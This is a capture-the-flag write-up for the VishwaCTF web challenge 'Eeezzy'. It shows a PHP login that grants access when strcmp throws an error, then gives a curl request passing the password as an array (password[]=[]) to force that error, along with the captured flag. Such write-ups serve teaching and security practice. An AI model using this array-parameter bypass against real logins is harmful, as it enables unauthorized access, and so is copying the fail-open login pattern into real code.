# **Writeup - VishwaCTF**

* Category **Web**
* Name **Eeezzy**
* Difficulty **Easy**

## Description
The challenge was about bypassing a login in php.
Viewing the source of the page, we can see the php code used for the login:
```
 <?php

    session_start();
    $_SESSION['status']=null;

    $flag="";
    try {
        if (isset($_GET['username']) && isset($_GET['password'])) {
            if (strcmp($_GET['username'], $flag)==0 && strcmp($_GET['password'], $flag)==0)
                $_SESSION['status']=$flag;
            else
                $_SESSION['status']="Invalid username or password";
        }
    } catch (Throwable $th) {
        $_SESSION['status']=$flag;
    }

?> 
```
We can see that there is a `strcmp` between our get parameters (username, password) and something we don't know.
This check is inside a try catch block and if it catches a `throwable` it will print the flag.

## Solution
Send the GET parameters as array so `strcmp` will throw an error.
`curl https://ch41763110254.ch.eng.run/?username=aaa&password[]=[]&submit=Login`

`VishwaCTF{5t0p_c0mp4r1ng}`
